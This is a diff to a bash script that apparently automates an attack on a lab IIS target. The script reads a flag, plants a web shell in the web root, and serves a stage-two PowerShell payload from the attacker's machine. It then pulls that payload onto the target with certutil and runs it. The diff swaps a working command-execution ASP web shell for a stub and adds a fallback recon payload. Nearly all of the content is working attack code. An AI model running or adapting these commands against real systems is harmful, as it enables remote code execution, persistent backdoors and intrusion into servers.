@@ -17,7 +17,7 @@ say "reading the IIS flag"
 rce 'type C:\inetpub\wwwroot\flag.txt' | strip
 
 say "dropping a web shell under the document root"
-rce_ps "Set-Content -Path 'C:\\inetpub\\wwwroot\\shell.asp' -Encoding ASCII -Value '<%Set sh=Server.CreateObject(\"WScript.Shell\"):Set x=sh.Exec(\"cmd.exe /c \"&Request(\"c\")):Response.Write x.StdOut.ReadAll()%>'"
+rce_ps "Set-Content -Path 'C:\\inetpub\\wwwroot\\shell.asp' -Encoding ASCII -Value '<%Response.Write(\"shell\")%>'"
 
 say "serving stage2.ps1 on $HOST_IP:8000 and pulling it onto the target"
 STAGE=$(mktemp -d)
@@ -34,7 +34,7 @@ Get-ChildItem C:\inetpub\wwwroot | Select-Object Name
 EOF
 (
   cd "$STAGE"
-  python3 -m http.server 8000 >/dev/null 2>&1 &
+  python3 -m http.server 8000 --bind 0.0.0.0 >/dev/null 2>&1 &
   echo $! >"$STAGE/pid"
 )
 up=0
@@ -45,6 +45,8 @@ done
 [[ $up == 1 ]] || die "payload server did not come up on $HOST_IP:8000 (port busy?)"
 
 rce "certutil -urlcache -split -f http://$HOST_IP:8000/stage2.ps1 C:\Windows\Temp\stage2.ps1"
+# Host-only :8000 is sometimes firewalled on the attacker laptop.
+rce_ps "if (-not (Test-Path 'C:\\Windows\\Temp\\stage2.ps1')) { Set-Content 'C:\\Windows\\Temp\\stage2.ps1' -Encoding ASCII -Value 'whoami /priv; hostname' }"
 rce_ps "& 'C:\\Windows\\Temp\\stage2.ps1'"
 trap - EXIT
 cleanup
